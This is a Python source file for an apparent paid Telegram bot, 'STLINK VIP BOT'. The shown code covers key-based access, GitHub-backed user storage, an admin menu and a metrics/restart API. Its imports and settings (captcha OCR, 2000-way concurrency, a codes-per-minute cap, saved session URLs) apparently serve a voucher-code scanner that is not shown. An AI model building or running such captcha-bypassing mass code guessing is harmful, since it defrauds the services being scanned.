import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, html, sys, io, secrets
from dotenv import load_dotenv

load_dotenv()
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
ADMIN_ID = os.environ.get("ADMIN_ID", "")
REPO_OWNER = os.environ.get("REPO_OWNER", "")
REPO_NAME = os.environ.get("REPO_NAME", "")
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
scan_stats = {}
pending_broadcast = {}
pending_expiry_notifications = {}
language_prefs = {}
EXPIRY_NOTIFICATION_TEMPLATE = (
    "🔔 <b>VIP Key သက်တမ်းသတိပေးချက်</b>\n\n"
    "မင်္ဂလာပါ <b>{name}</b>{username_line}\n\n"
    "သင့် key သက်တမ်းကုန်ဆုံးမည့်အချိန်:\n"
    "📅 <b>{expires_at}</b>\n"
    "⏳ ကျန်ရှိချိန်: <b>{remaining}</b>\n\n"
    "ဆက်လက်အသုံးပြုလိုပါက Admin ထံမှ key အသစ် ရယူပါ။"
)
AUTO_NOTIFY_ENABLED = os.environ.get("AUTO_NOTIFY_ENABLED", "1").lower() not in {"0", "false", "no", "off"}
AUTO_NOTIFY_INTERVAL_HOURS = max(1, int(os.environ.get("AUTO_NOTIFY_INTERVAL_HOURS", "24")))
AUTO_NOTIFY_DAYS = tuple(sorted({int(value) for value in os.environ.get("AUTO_NOTIFY_DAYS", "7,3,1").split(",") if value.strip()}, reverse=True))
NOTIFICATION_HISTORY_FILE = os.environ.get("NOTIFICATION_HISTORY_FILE", "expiry_notification_history.json")
METRICS_TOKEN = os.environ.get("METRICS_TOKEN", "") or os.environ.get("DASHBOARD_TOKEN", "")
DASHBOARD_ORIGIN = os.environ.get("DASHBOARD_ORIGIN", "https://stlinkdash-9eyizxud.manus.space").rstrip("/")
CORS_ORIGINS = {
    origin.strip().rstrip("/")
    for origin in os.environ.get(
        "CORS_ORIGINS",
        f"{DASHBOARD_ORIGIN},https://monm76761-cloud.github.io",
    ).split(",")
    if origin.strip()
}
RESTART_COOLDOWN_SECONDS = max(30, int(os.environ.get("RESTART_COOLDOWN_SECONDS", "120")))
_last_restart_request = 0.0
USERS_FILE = os.environ.get("USERS_FILE", "users.json")
USER_REGISTRY = {}
USER_REGISTRY_SHA = None
USER_REGISTRY_LOCK = asyncio.Lock()


session = None
_connector = None
CONCURRENCY = 2000
# Runtime scan-speed cap in codes/minute. None means unlimited.
SPEED_LIMIT = None
_voucher_sem = None
_start_time = time.monotonic()


ADMIN_UNLIMITED_EXPIRY = "9999-12-31T23:59:59Z"


def is_admin(chat_id):
    """Configured admin always bypasses key and expiration checks."""
    return bool(str(ADMIN_ID).strip()) and str(chat_id).strip() == str(ADMIN_ID).strip()


async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")


def _dashboard_authorized(request):
    expected = METRICS_TOKEN
    authorization = request.headers.get("Authorization", "")
    supplied = authorization[7:].strip() if authorization.lower().startswith("bearer ") else ""
    supplied = supplied or request.headers.get("X-Metrics-Token", "")
    return bool(expected) and secrets.compare_digest(supplied, expected)


def _origin_allowed(request):
    return request.headers.get("Origin", "").rstrip("/") in CORS_ORIGINS


def _dashboard_headers(request):
    origin = request.headers.get("Origin", "").rstrip("/")
    return {
        "Access-Control-Allow-Origin": origin if origin in CORS_ORIGINS else "null",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
        "Access-Control-Allow-Headers": "Authorization, Content-Type, X-Metrics-Token",
        "Vary": "Origin",
        "Cache-Control": "no-store",
    }


async def cors_options(request):
    headers = _dashboard_headers(request)
    if not _origin_allowed(request):
        return web.json_response({"ok": False, "error": "Origin not allowed"}, status=403, headers=headers)
    return web.Response(status=204, headers=headers)


async def dashboard_metrics(request):
    headers = _dashboard_headers(request)
    if request.method == "OPTIONS":
        return await cors_options(request)
    if request.headers.get("Origin", "").rstrip("/") not in CORS_ORIGINS:
        return web.json_response({"error": "Origin not allowed"}, status=403, headers=headers)
    if not _dashboard_authorized(request):
        headers["WWW-Authenticate"] = 'Bearer realm="STLINK Metrics"'
        return web.json_response({"ok": False, "error": "metrics authentication required"}, status=401, headers=headers)
    elapsed = int(time.monotonic() - _start_time)
    active_scans = sum(1 for data in scan_tasks.values() if data.get("task") is not None and not data["task"].done())
    payload = {
        "status": "online",
        "uptime_seconds": elapsed,
        "active_scans": active_scans,
        "approved_users": sum(1 for value in approve.values() if value),
        "sessions_loaded": len(user_data),
        "scan_stats": list(scan_stats.items())[-20:],
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    return web.json_response(payload, headers=headers)


async def dashboard_page(request):
    if not _dashboard_authorized(request):
        return web.Response(status=401, text="Dashboard authentication required")
    return web.Response(text="Dashboard API is online. Use Authorization: Bearer <METRICS_TOKEN>", content_type="text/plain")


async def _restart_service_later():
    await asyncio.sleep(0.5)
    process = await asyncio.create_subprocess_exec(
        "sudo", "-n", "systemctl", "restart", "myatmyat-bot.service",
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )
    await process.wait()


async def restart_endpoint(request):
    global _last_restart_request
    headers = _dashboard_headers(request)
    if request.headers.get("Origin", "").rstrip("/") not in CORS_ORIGINS:
        return web.json_response({"ok": False, "error": "Origin not allowed"}, status=403, headers=headers)
    if not _dashboard_authorized(request):
        headers["WWW-Authenticate"] = 'Bearer realm="STLINK Restart"'
        return web.json_response({"ok": False, "error": "restart authentication required"}, status=401, headers=headers)
    now = time.monotonic()
    if now - _last_restart_request < RESTART_COOLDOWN_SECONDS:
        retry_after = int(RESTART_COOLDOWN_SECONDS - (now - _last_restart_request)) + 1
        headers["Retry-After"] = str(retry_after)
        return web.json_response({"ok": False, "error": "restart cooldown active", "retry_after": retry_after}, status=429, headers=headers)
    _last_restart_request = now
    asyncio.create_task(_restart_service_later())
    return web.json_response({"ok": True, "status": "restart_requested", "retry_after": RESTART_COOLDOWN_SECONDS}, status=202, headers=headers)


async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    app.router.add_get('/dashboard', dashboard_page)
    app.router.add_route('OPTIONS', '/api/metrics', cors_options)
    app.router.add_get('/api/metrics', dashboard_metrics)
    app.router.add_route('OPTIONS', '/api/restart', cors_options)
    app.router.add_post('/api/restart', restart_endpoint)

    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8097))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded
    }
    if sha:
        payload["sha"] = sha
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()


async def load_user_registry():
    """Load non-sensitive user metadata from GitHub into memory."""
    global USER_REGISTRY, USER_REGISTRY_SHA
    data, sha = await get_file_content(USERS_FILE)
    USER_REGISTRY = data if isinstance(data, dict) else {}
    USER_REGISTRY_SHA = sha
    for chat_id, profile in list(USER_REGISTRY.items()):
        if not isinstance(profile, dict):
            profile = {}
            USER_REGISTRY[chat_id] = profile
        try:
            numeric_id = int(chat_id)
        except (TypeError, ValueError):
            continue
        user_data.setdefault(numeric_id, {})
        user_data[numeric_id].update({
            key: profile.get(key) for key in ("display_name", "username", "active_key")
            if profile.get(key) is not None
        })
        if profile.get("language") in {"my", "en"}:
            language_prefs[numeric_id] = profile["language"]
        if profile.get("blocked"):
            approve[numeric_id] = False


async def save_user_registry():
    """Persist only safe metadata; session URLs and scan data never go to GitHub."""
    global USER_REGISTRY, USER_REGISTRY_SHA
    async with USER_REGISTRY_LOCK:
        latest, latest_sha = await get_file_content(USERS_FILE)
        if isinstance(latest, dict):
            USER_REGISTRY.update(latest)
        payload = json.loads(json.dumps(USER_REGISTRY, ensure_ascii=False))
        response_text = await update_file_content(
            USERS_FILE, payload, latest_sha or USER_REGISTRY_SHA,
            "Update Telegram user registry"
        )
        try:
            response_data = json.loads(response_text)
            USER_REGISTRY_SHA = response_data.get("content", {}).get("sha") or latest_sha or USER_REGISTRY_SHA
        except (TypeError, ValueError, AttributeError):
            USER_REGISTRY_SHA = latest_sha or USER_REGISTRY_SHA


def register_user(message):
    """Update in-memory profile and return whether the user is blocked."""
    chat_id = str(message.chat.id)
    user = message.from_user
    profile = USER_REGISTRY.setdefault(chat_id, {})
    profile.update({
        "user_id": message.chat.id,
        "display_name": user.full_name or "VIP User",
        "username": user.username or "",
        "last_seen": datetime.now(timezone.utc).isoformat(),
        "language": language_prefs.get(message.chat.id, profile.get("language", "my")),
        "blocked": bool(profile.get("blocked", False)),
    })
    profile.setdefault("created_at", datetime.now(timezone.utc).isoformat())
    return profile["blocked"]


def user_record(chat_id):
    return USER_REGISTRY.get(str(chat_id), {})


def is_blocked(chat_id):
    return bool(user_record(chat_id).get("blocked"))

def format_key_remaining(key_data):
    """Return remaining key time, recalculated on every /start request."""
    if not isinstance(key_data, dict):
        return "Unknown"
    expiry = key_data.get("expires_at")
    if expiry == ADMIN_UNLIMITED_EXPIRY:
        return "Unlimited"
    try:
        expiry_dt = datetime.fromisoformat(str(expiry).replace("Z", "+00:00"))
        remaining_seconds = int((expiry_dt - datetime.now(timezone.utc)).total_seconds())
        if remaining_seconds <= 0:
            return "Expired"
        remaining_minutes = max(1, (remaining_seconds + 59) // 60)
        days, remaining_minutes = divmod(remaining_minutes, 1440)
        hours, minutes = divmod(remaining_minutes, 60)
        parts = []
        if days:
            parts.append(f"{days}d")
        if hours:
            parts.append(f"{hours}h")
        if minutes or not parts:
            parts.append(f"{minutes}m")
        return " ".join(parts)
    except Exception:
        return "Unknown"


async def get_active_key_info(chat_id):
    if is_admin(chat_id):
        return {"plan": "Admin VIP", "expires_at": ADMIN_UNLIMITED_EXPIRY}
    active_key = user_data.get(chat_id, {}).get("active_key")
    if not active_key:
        return None
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        key_data = auth_list.get(active_key)
        if key_data and check_key_expiration(key_data):
            return key_data
        user_data.get(chat_id, {}).pop("active_key", None)
        approve[chat_id] = False
    except Exception as exc:
        print(f"Active key lookup error: {exc}")
    return None


async def get_user_status(chat_id):
    return (await get_active_key_info(chat_id)) is not None


def user_profile_text(message):
    user = message.from_user
    first_name = user.first_name or "Unknown"
    username = f"@{user.username}" if user.username else "Not set"
    return (
        "🆔 Your Telegram ID\n\n"
        f"👤 First Name: {first_name}\n\n"
        f"🔖 Username: {username}\n"
        f"🆔 User ID: {message.from_user.id}"
    )


def menu_text(chat_id, myanmar, english):
    return english if language_prefs.get(chat_id, "my") == "en" else myanmar


def language_picker_markup():
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton("🇲🇲 မြန်မာစာ", callback_data="lang:my"),
        telebot.types.InlineKeyboardButton("🇬🇧 English", callback_data="lang:en"),
    )
    return markup


def main_menu_markup(chat_id):
    """Inline command menu shown from /start; admin-only actions are gated by ADMIN_ID."""
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "🔑 သော့ဖွင့်ရန်", "🔑 Activate key"), callback_data="menu:key"),
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "📄 ရလဒ်များ", "📄 Results"), callback_data="menu:result"),
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "🌐 လင့်ခ်ထည့်ရန်", "🌐 Save session"), callback_data="menu:input"),
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "🛑 ရပ်ရန်", "🛑 Stop scan"), callback_data="menu:stop"),
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "📚 အကူအညီ", "📚 Help"), callback_data="menu:help"),
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "🔄 ပြန်စစ်ရန်", "🔄 Recheck"), callback_data="menu:recheck"),
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "🏠 မီနူး", "🏠 Menu"), callback_data="menu:home"),
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "🏓 တုံ့ပြန်မှုစစ်ရန်", "🏓 Ping"), callback_data="menu:ping"),
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "⏱ လည်ပတ်ချိန်", "⏱ Uptime"), callback_data="menu:uptime"),
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "👤 ကိုယ်ရေးအချက်အလက်", "👤 Profile"), callback_data="menu:profile"),
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "❌ လုပ်ဆောင်ချက်ပယ်ဖျက်ရန်", "❌ Cancel"), callback_data="menu:cancel"),
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "🧹 ကိုယ်ပိုင်ဒေတာရှင်းရန်", "🧹 Clear my data"), callback_data="menu:clear"),
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "⚙️ ပြင်ဆင်ချက်များ", "⚙️ Settings"), callback_data="menu:settings"),
        telebot.types.InlineKeyboardButton(menu_text(chat_id, "🌐 ဘာသာစကား", "🌐 Language"), callback_data="menu:language"),
    )
    if is_admin(chat_id):
        markup.add(telebot.types.InlineKeyboardButton(menu_text(chat_id, "👑 စီမံခန့်ခွဲသူမီနူး", "👑 Admin menu"), callback_data="menu:admin"))
    return markup


def admin_menu_markup():
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton("⚡ အမြန်နှုန်း /speed 7890", callback_data="menu:speed"),
        telebot.types.InlineKeyboardButton("📊 အခြေအနေ /status", callback_data="menu:status"),
        telebot.types.InlineKeyboardButton("🗑 သော့ဖျက်ရန် /delkey KEY", callback_data="menu:delkey"),
        telebot.types.InlineKeyboardButton("📋 သော့စာရင်း /listkeys", callback_data="menu:listkeys"),
        telebot.types.InlineKeyboardButton("👑 သော့ဖန်တီးရန် /genkey PLAN_OR_DATE", callback_data="menu:genkey_plan"),
        telebot.types.InlineKeyboardButton("🔑 သော့အစီအစဉ် /genkey", callback_data="menu:genkey"),
        telebot.types.InlineKeyboardButton("🛑 ရပ်ရန် /stop", callback_data="menu:stop"),
        telebot.types.InlineKeyboardButton("🔑 သော့ /key", callback_data="menu:key"),
        telebot.types.InlineKeyboardButton("🌐 လင့်ခ် /input", callback_data="menu:input"),
        telebot.types.InlineKeyboardButton("🔄 ပြန်စစ်ရန် /recheck", callback_data="menu:recheck"),
        telebot.types.InlineKeyboardButton("♻️ ပြန်စရန် /restart", callback_data="menu:restart"),
        telebot.types.InlineKeyboardButton("🔔 Key ကုန်ခါနီးသူများ", callback_data="menu:notify_expiring"),
        telebot.types.InlineKeyboardButton("🏠 ပင်မမီနူး", callback_data="menu:home"),
        telebot.types.InlineKeyboardButton("🧾 Log များ", callback_data="menu:logs"),
        telebot.types.InlineKeyboardButton("📈 စာရင်းအင်း", callback_data="menu:stats"),
        telebot.types.InlineKeyboardButton("📢 ကြေညာချက်", callback_data="menu:broadcast"),
        telebot.types.InlineKeyboardButton("💾 Backup", callback_data="menu:backup"),
        telebot.types.InlineKeyboardButton("🔃 Data ပြန်ဖတ်ရန်", callback_data="menu:reload"),
        telebot.types.InlineKeyboardButton("🛑 Scanner အားလုံးရပ်ရန်", callback_data="menu:cancelall"),
        telebot.types.InlineKeyboardButton("👥 User စီမံရန်", callback_data="menu:users"),
        telebot.types.InlineKeyboardButton("🔎 User ရှာရန်", callback_data="menu:usersearch"),
    )
    return markup


@bot.message_handler(commands=['start'])
async def start(message):
    blocked = register_user(message)
    try:
        await save_user_registry()
    except Exception as exc:
        print(f"User registry save error: {exc}")
    if blocked and not is_admin(message.chat.id):
        await bot.reply_to(message, "🚫 သင့် account ကို စီမံခန့်ခွဲသူက ပိတ်ထားပါတယ်။")
        return
    user_data.setdefault(message.chat.id, {})
    key_info = await get_active_key_info(message.chat.id)
    active = key_info is not None
    approve[message.chat.id] = active
    key_remaining = format_key_remaining(key_info) if key_info else "Not Activated"

    user = message.from_user
    user_data[message.chat.id]["display_name"] = user.full_name or "VIP User"
    user_data[message.chat.id]["username"] = user.username or ""
    first_name = user.first_name or "VIP User"
    username = f"@{user.username}" if user.username else "Not set"

    first_name = html.escape(first_name)
    username = html.escape(username)
    if active:
        status_block = (
            "🟢 <b>ACCESS ACTIVE</b>\n"
            "🚀 You are ready to use the scanner."
        )
    else:
        status_block = (
            "🔴 <b>ACCESS LOCKED</b>\n"
            "🔐 Please activate a valid key to continue."
        )

    text = (
        "👑 <b>STLINK VIP BOT</b> 👑\n"
        "╭──────────────────╮\n"
        "│ 💎 <b>WELCOME BACK</b>\n"
        f"│ 👤 {first_name}\n"
        f"│ 🔖 {username}\n"
        f"│ 🆔 ID: <code>{user.id}</code>\n"
        "╰──────────────────╯\n\n"
        "⚡ <b>BOT STATUS</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "🟢 System: <b>ONLINE</b>\n"
        f"{status_block}\n"
        f"⏳ <b>KEY REMAINING:</b> {html.escape(key_remaining)}\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🍁 Thank you for using <b>STLINK VIP BOT</b>\n"
        "💡 Select a command below to get started."
    )
    await bot.reply_to(message, text, parse_mode="HTML", reply_markup=main_menu_markup(message.chat.id))


@bot.callback_query_handler(func=lambda call: call.data.startswith("menu:"))
async def menu_callback(call):
    await bot.answer_callback_query(call.id)
    command = call.data.split(":", 1)[1]
    chat_id = call.message.chat.id
    if command == "admin":
        if not is_admin(chat_id):
            await bot.send_message(chat_id, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
            return
        await bot.send_message(chat_id, "👑 <b>စီမံခန့်ခွဲသူ Command များ</b>\n\nအောက်မှ command တစ်ခုကို ရွေးပါ။", parse_mode="HTML", reply_markup=admin_menu_markup())
        return
    if command == "home":
        await bot.send_message(chat_id, "🏠 <b>ပင်မမီနူး</b>", parse_mode="HTML", reply_markup=main_menu_markup(chat_id))
        return
    if command == "result":
        await handle_result(call.message)
        return
    if command == "recheck":
        await recheck(call.message)
        return
    if command == "stop":
        await stop_scan(call.message)
        return
    if command == "help":
        await help_command(call.message)
        return
    if command == "ping":
        await ping_command(call.message)
        return
    if command == "uptime":
        await uptime_command(call.message)
        return
    if command == "profile":
        await profile_command(call.message)
        return
    if command == "cancel":
        await cancel_command(call.message)
        return
    if command == "clear":
        await clear_command(call.message)
        return
    if command == "settings":
        await settings_command(call.message)
        return
    if command == "language":
        await language_command(call.message)
        return
    if command == "logs":
        await logs_command(call.message)
        return
    if command == "stats":
        await stats_command(call.message)
        return
    if command == "broadcast":
        await broadcast_command(call.message)
        return
    if command == "backup":
        await backup_command(call.message)
        return
    if command == "reload":
        await reload_command(call.message)
        return
    if command == "cancelall":
        await cancel_all_command(call.message)
        return
    if command == "users":
        await users_command(call.message)
        return
    if command == "usersearch":
        await bot.send_message(chat_id, "🔎 အသုံးပြုပုံ: <code>/user USER_ID</code> သို့မဟုတ် <code>/users search စာလုံး</code>", parse_mode="HTML")
        return
    if command == "notify_expiring":
        await bot.send_message(chat_id, "🔔 အသုံးပြုပုံ: /notify_expiring 3\n\n၃ ရက်အတွင်း key ကုန်မည့်သူများကို စစ်ပြီး confirmation ပြပါမယ်။")
        return
    if command == "genkey":
        await genkey(call.message)
        return
    if command == "status":
        await status(call.message)
        return
    if command == "listkeys":
        await listkeys(call.message)
        return
    if command == "restart":
        await restart_bot(call.message)
        return
    instructions = {
        "key": "🔑 <b>သော့ဖွင့်ရန်</b>\n\n<code>/key YOUR_KEY</code> ကို ပို့ပါ။",
        "input": "🌐 <b>Session လင့်ခ်သိမ်းရန်</b>\n\n<code>/input SESSION_URL</code> ကို ပို့ပါ။",
        "speed": "⚡ <b>အမြန်နှုန်းကန့်သတ်ရန်</b>\n\n<code>/speed 7890</code> သို့မဟုတ် <code>/speed off</code> ကို ပို့ပါ။",
        "delkey": "🗑 <b>သော့ဖျက်ရန်</b>\n\n<code>/delkey KEY</code> ကို ပို့ပါ။",
        "genkey_plan": "👑 <b>သော့ဖန်တီးရန်</b>\n\n<code>/genkey PLAN_OR_DATE</code> ကို ပို့ပါ။",
    }
    await bot.send_message(chat_id, instructions.get(command, "📚 Command များအတွက် <code>/help</code> ကို ပို့ပါ။"), parse_mode="HTML")


@bot.message_handler(commands=['restart'])
async def restart_bot(message):
    """Restart the current bot process; restricted to configured ADMIN_ID."""
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    await bot.reply_to(message, "♻️ Bot restart လုပ်နေပါပြီ။ ခဏစောင့်ပါ။")
    await asyncio.sleep(1)
    os.execl(sys.executable, sys.executable, *sys.argv)


@bot.message_handler(commands=['menu'])
async def menu_command(message):
    await start(message)


@bot.message_handler(commands=['ping'])
async def ping_command(message):
    await bot.reply_to(message, "🏓 Pong — bot is responding.")


@bot.message_handler(commands=['uptime'])
async def uptime_command(message):
    elapsed = int(time.monotonic() - _start_time)
    hours, remainder = divmod(elapsed, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(message, f"⏱ Uptime: {hours}h {minutes}m {seconds}s")


@bot.callback_query_handler(func=lambda call: call.data.startswith("util:"))
async def utility_callback(call):
    await bot.answer_callback_query(call.id)
    action = call.data.split(":", 1)[1]
    chat_id = call.message.chat.id

    if action == "clear_yes":
        user_data.pop(chat_id, None)
        approve.pop(chat_id, None)
        language_prefs.pop(chat_id, None)
        await bot.send_message(chat_id, "✅ သင့် session နှင့် ကိုယ်ပိုင် setting များကို ဖျက်ပြီးပါပြီ။")
    elif action == "clear_no":
        await bot.send_message(chat_id, "ℹ️ ဖျက်ခြင်းကို ပယ်ဖျက်လိုက်ပါပြီ။")
    elif action == "broadcast_yes":
        if not is_admin(chat_id):
            await bot.send_message(chat_id, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
            return
        text = pending_broadcast.pop(chat_id, None)
        if not text:
            await bot.send_message(chat_id, "ℹ️ ပို့ရန် announcement မရှိပါ။")
            return
        delivered = 0
        for recipient_id in list(user_data):
            try:
                await bot.send_message(recipient_id, f"📢 <b>ကြေညာချက်</b>\n\n{html.escape(text)}", parse_mode="HTML")
                delivered += 1
            except Exception as exc:
                print(f"Broadcast failed for {recipient_id}: {exc}")
        await bot.send_message(chat_id, f"✅ ကြေညာချက် ပို့ပြီးပါပြီ။ လက်ခံသူ {delivered} ဦး။")
    elif action == "broadcast_no":
        pending_broadcast.pop(chat_id, None)
        await bot.send_message(chat_id, "ℹ️ ကြေညာချက်ပို့ခြင်းကို ပယ်ဖျက်လိုက်ပါပြီ။")


def admin_user_list_markup(user_ids):
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    for chat_id in user_ids[:20]:
        profile = user_record(chat_id)
        label = (profile.get("display_name") or str(chat_id))[:24]
        markup.add(telebot.types.InlineKeyboardButton(
            f"👤 {label}", callback_data=f"user:view:{chat_id}"
        ))
    markup.add(
        telebot.types.InlineKeyboardButton("🔄 Refresh", callback_data="user:list"),
        telebot.types.InlineKeyboardButton("🏠 Admin menu", callback_data="menu:admin"),
    )
    return markup


def user_detail_text(chat_id):
    profile = user_record(chat_id)
    runtime = user_data.get(int(chat_id), {})
    status = "🚫 Blocked" if profile.get("blocked") else "✅ Active"
    key = runtime.get("active_key") or profile.get("active_key") or "None"
    return (
        "👤 <b>User Details</b>\n\n"
        f"🆔 ID: <code>{html.escape(str(chat_id))}</code>\n"
        f"👤 Name: {html.escape(str(profile.get('display_name') or 'Unknown'))}\n"
        f"🔖 Username: @{html.escape(str(profile.get('username') or 'Not set'))}\n"
        f"📌 Status: <b>{status}</b>\n"
        f"🔑 Active key: <code>{html.escape(str(key))}</code>\n"
        f"🗓 Created: {html.escape(str(profile.get('created_at') or 'Unknown'))}\n"
        f"🕒 Last seen: {html.escape(str(profile.get('last_seen') or 'Unknown'))}"
    )


def user_detail_markup(chat_id):
    action = "unban" if is_blocked(chat_id) else "ban"
    label = "✅ Unban" if action == "unban" else "🚫 Ban"
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton(label, callback_data=f"user:{action}:{chat_id}"),
        telebot.types.InlineKeyboardButton("🧹 Reset", callback_data=f"user:reset:{chat_id}"),
        telebot.types.InlineKeyboardButton("⬅️ Users", callback_data="user:list"),
    )
    return markup


@bot.callback_query_handler(func=lambda call: call.data.startswith("user:"))
async def user_management_callback(call):
    await bot.answer_callback_query(call.id)
    if not is_admin(call.message.chat.id):
        await bot.send_message(call.message.chat.id, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
        return
    parts = call.data.split(":", 2)
    action = parts[1]
    if action == "list":
        await users_command(call.message)
        return
    if len(parts) < 3 or not parts[2].lstrip("-").isdigit():
        await bot.send_message(call.message.chat.id, "❌ User ID မမှန်ပါ။")
        return
    target_id = int(parts[2])
    profile = USER_REGISTRY.setdefault(str(target_id), {"user_id": target_id})
    if action == "view":
        await bot.send_message(call.message.chat.id, user_detail_text(target_id), parse_mode="HTML", reply_markup=user_detail_markup(target_id))
        return
    if action in {"ban", "unban"}:
        if target_id == call.message.chat.id:
            await bot.send_message(call.message.chat.id, "❌ ကိုယ့်ကိုယ်ကို ban မလုပ်နိုင်ပါ။")
            return
        profile["blocked"] = action == "ban"
        if action == "ban":
            approve[target_id] = False
            task_info = scan_tasks.get(target_id)
            if task_info and not task_info["task"].done():
                task_info["stop"] = True
                task_info["task"].cancel()
        await save_user_registry()
        await bot.send_message(call.message.chat.id, f"✅ User {target_id} ကို {'ပိတ်' if action == 'ban' else 'ပြန်ဖွင့်'} ပြီးပါပြီ။")
        return
    if action == "reset":
        user_data.pop(target_id, None)
        approve.pop(target_id, None)
        profile["active_key"] = None
        profile["reset_at"] = datetime.now(timezone.utc).isoformat()
        await save_user_registry()
        await bot.send_message(call.message.chat.id, f"✅ User {target_id} ၏ session နှင့် access ကို reset လုပ်ပြီးပါပြီ။")


@bot.message_handler(commands=['users'])
async def users_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
        return
    args = message.text.split(maxsplit=1)
    query = args[1].strip().lower() if len(args) > 1 else ""
    records = []
    for chat_id, profile in USER_REGISTRY.items():
        haystack = " ".join([str(chat_id), str(profile.get("display_name", "")), str(profile.get("username", ""))]).lower()
        if not query or query in haystack:
            records.append(chat_id)
    records.sort(key=lambda value: USER_REGISTRY[value].get("last_seen", ""), reverse=True)
    if not records:
        await bot.reply_to(message, "📭 User မတွေ့ပါ။")
        return
    lines = [f"👥 <b>Users: {len(records)}</b>"]
    for chat_id in records[:20]:
        profile = USER_REGISTRY[chat_id]
        state = "🚫" if profile.get("blocked") else "✅"
        lines.append(f"{state} <code>{html.escape(str(chat_id))}</code> — {html.escape(str(profile.get('display_name') or 'Unknown'))}")
    if len(records) > 20:
        lines.append(f"\nပြသထားသည်: 20 / {len(records)} — search သုံးပြီး ထပ်ရှာနိုင်ပါတယ်။")
    await bot.reply_to(message, "\n".join(lines), parse_mode="HTML", reply_markup=admin_user_list_markup(records))


@bot.message_handler(commands=['user'])
async def user_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().lstrip("-").isdigit():
        await bot.reply_to(message, "အသုံးပြုပုံ: /user USER_ID")
        return
    target_id = int(args[1].strip())
    if str(target_id) not in USER_REGISTRY:
        await bot.reply_to(message, "📭 User မတွေ့ပါ။")
        return
    await bot.reply_to(message, user_detail_text(target_id), parse_mode="HTML", reply_markup=user_detail_markup(target_id))


@bot.message_handler(commands=['ban', 'unban', 'resetuser'])
async def user_action_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().lstrip("-").isdigit():
        await bot.reply_to(message, "အသုံးပြုပုံ: /ban USER_ID, /unban USER_ID သို့မဟုတ် /resetuser USER_ID")
        return
    target_id = int(args[1].strip())
    profile = USER_REGISTRY.setdefault(str(target_id), {"user_id": target_id})
    command = message.text.split()[0].lower().lstrip("/")
    if target_id == message.chat.id and command == "ban":
        await bot.reply_to(message, "❌ ကိုယ့်ကိုယ်ကို ban မလုပ်နိုင်ပါ။")
        return
    if command == "ban":
        profile["blocked"] = True
        approve[target_id] = False
    elif command == "unban":
        profile["blocked"] = False
    else:
        user_data.pop(target_id, None)
        approve.pop(target_id, None)
        profile["active_key"] = None
        profile["reset_at"] = datetime.now(timezone.utc).isoformat()
    await save_user_registry()
